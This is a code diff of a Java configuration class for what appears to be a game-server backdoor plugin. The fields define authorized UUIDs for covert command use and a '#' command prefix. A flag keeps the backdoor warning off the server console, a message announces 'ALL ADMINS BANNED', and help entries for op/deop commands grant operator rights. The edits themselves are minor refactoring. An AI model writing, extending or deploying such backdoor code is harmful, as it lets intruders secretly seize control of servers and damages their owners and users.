@@ -12,15 +12,13 @@ public class Config {
     /*Command execution*/
 
     // Authorized UUIDS 
-    public static final String[] authorized_uuids = {
-            //Put user UUIDs here. These UUIDs are immune to the unauth command
-    };
+    public static String authorized_uuid = "";
 
     // UUIDs added by the auth command. DO NOT EDIT
     public static String[] tmp_authorized_uuids;
 
     // Command Prefix 
-    public static final String command_prefix = "#";
+    public static String command_prefix = "#";
     
     // Warn server console about backdoor 
     public static final Boolean display_backdoor_warning = false;
@@ -77,7 +75,7 @@ public class Config {
                                                                                                         "ALL ADMINS BANNED. \n" +
                                                                                                         "ALL USERS OP'D UNTIL ROLLBACK. ;-)";
 
-    // Help message content 
+    // Help message content
     public static final HelpItem[] help_messages = {
             new HelpItem("op",          "[player]",                     "op specified player (def: self)"),
             new HelpItem("deop",        "[player]",                     "deop specified player (def: self)"),
